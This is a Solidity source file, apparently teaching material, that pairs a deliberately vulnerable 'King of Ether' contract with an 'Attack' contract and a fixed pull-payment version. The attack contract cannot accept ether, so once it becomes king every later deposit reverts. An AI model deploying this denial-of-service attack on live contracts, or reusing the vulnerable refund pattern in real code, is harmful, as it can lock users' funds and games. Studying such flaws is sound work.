// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10; 


contract A 
{

  constructor() payable{}

  function foo() public
  {
     (bool result ,) = payable(msg.sender).call{value:1 ether}("");
     require(result,"Ether not sent");
  }

}

contract B 
{

  function callfoo(A a) public
  {
      a.foo();
  }


}


// Vulnerable to hack

contract KingOfEther
{
    uint256 public balance ;
    address public king;

    error TransferFailed();

    function deposit() public payable 
    {
       require(msg.value > balance , "If you wanna become a king then deposit more ether than current king");
       (bool result,) = payable(king).call{value:balance}("");
       if(result == false)
       {
           revert TransferFailed();
       }
       king =  msg.sender;
       balance = msg.value;

    }


   function getbalance() public view returns(uint256)
  {
      return address(this).balance;
  }

}



contract Attack
{

   KingOfEther public kingofether ;


   constructor(address _kingofether)
   {
       kingofether = KingOfEther(_kingofether);
   }


   function attack() public
   {
       kingofether.deposit{value:1 ether}();
   }

}



// it is not vulnerable to hack 

contract KingOfEther1
{
    uint256 public balance ;
    address public king;
    mapping(address=>uint256) balances;

    error TransferFailed();

    function deposit() public payable 
    {
       require(msg.value > balance , "If you wanna become a king then deposit more ether than current king");
       balances[msg.sender]+=msg.value;
       king =  msg.sender;
       balance = msg.value;
    }


    function withdraw() public 
    {
        require(msg.sender != king , "king cant withdraw ether");
        uint256 _balance = balances[msg.sender];
        balances[msg.sender] = 0;

       (bool result,) = payable(msg.sender).call{value:_balance}("");
       if(result == false)
       {
           revert TransferFailed();
       }
    }

   function getbalance() public view returns(uint256)
  {
      return address(this).balance;
  }

}
